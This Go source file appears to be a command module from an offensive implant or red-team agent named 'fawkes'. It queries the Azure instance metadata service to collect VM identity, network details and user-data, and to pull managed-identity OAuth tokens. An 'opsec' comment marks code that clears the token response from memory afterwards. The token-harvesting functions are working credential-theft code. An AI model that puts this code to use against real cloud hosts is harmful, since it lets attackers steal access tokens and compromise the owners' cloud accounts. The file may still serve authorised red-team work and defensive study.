package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// --- Azure ---

func azureDumpAll(timeout time.Duration) string {
	var sb strings.Builder
	sb.WriteString("=== Azure VM Metadata ===\n")
	h := map[string]string{"Metadata": "true"}

	resp := metadataGet(azureInstanceURL, timeout, h)
	if resp == "" {
		sb.WriteString("[-] Azure: Could not retrieve instance metadata\n")
		return sb.String()
	}

	formatted := formatAzureInstanceJSON(resp)
	if formatted != "" {
		sb.WriteString(formatted)
	}
	// Network section from same response
	sb.WriteString("  Network:\n")
	netFormatted := formatAzureNetworkJSON(resp)
	if netFormatted != "" {
		sb.WriteString(netFormatted)
	}

	sb.WriteString("\n")
	sb.WriteString(azureGetToken(timeout))
	sb.WriteString("\n")
	sb.WriteString(azureGetUserdata(timeout))

	return sb.String()
}

func azureGetToken(timeout time.Duration) string {
	var sb strings.Builder
	h := map[string]string{"Metadata": "true"}

	resp := metadataGet(azureTokenURL, timeout, h)
	if resp == "" {
		sb.WriteString("[*] Azure: No managed identity configured or token unavailable\n")
		return sb.String()
	}

	sb.WriteString(formatAzureTokenJSON(resp))
	structs.ZeroString(&resp) // opsec: clear OAuth token response
	return sb.String()
}

func azureGetIdentity(timeout time.Duration) string {
	var sb strings.Builder
	h := map[string]string{"Metadata": "true"}

	resp := metadataGet(azureInstanceURL, timeout, h)
	if resp == "" {
		sb.WriteString("[-] Azure: Could not retrieve identity\n")
		return sb.String()
	}

	var inst map[string]interface{}
	if err := json.Unmarshal([]byte(resp), &inst); err == nil {
		sb.WriteString("[+] Azure Identity:\n")
		if compute, ok := inst["compute"].(map[string]interface{}); ok {
			for _, key := range []string{"name", "vmId", "subscriptionId", "resourceGroupName", "location", "osType"} {
				if v, ok := compute[key]; ok && v != "" {
					sb.WriteString(fmt.Sprintf("    %-22s %v\n", key+":", v))
				}
			}
		}
	}
	return sb.String()
}

func azureGetUserdata(timeout time.Duration) string {
	var sb strings.Builder
	h := map[string]string{"Metadata": "true"}

	udURL := azureMetadataBase + "/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
	ud := metadataGet(udURL, timeout, h)
	if ud == "" {
		sb.WriteString("[*] Azure: No user-data configured\n")
	} else {
		sb.WriteString("[+] Azure User Data (base64):\n")
		sb.WriteString(truncate(ud, 4096))
		sb.WriteString("\n")
	}
	return sb.String()
}

func azureGetNetwork(timeout time.Duration) string {
	var sb strings.Builder
	h := map[string]string{"Metadata": "true"}

	resp := metadataGet(azureInstanceURL, timeout, h)
	if resp == "" {
		sb.WriteString("[-] Azure: Could not retrieve network info\n")
		return sb.String()
	}

	sb.WriteString("[+] Azure Network:\n")
	sb.WriteString(formatAzureNetworkJSON(resp))
	return sb.String()
}
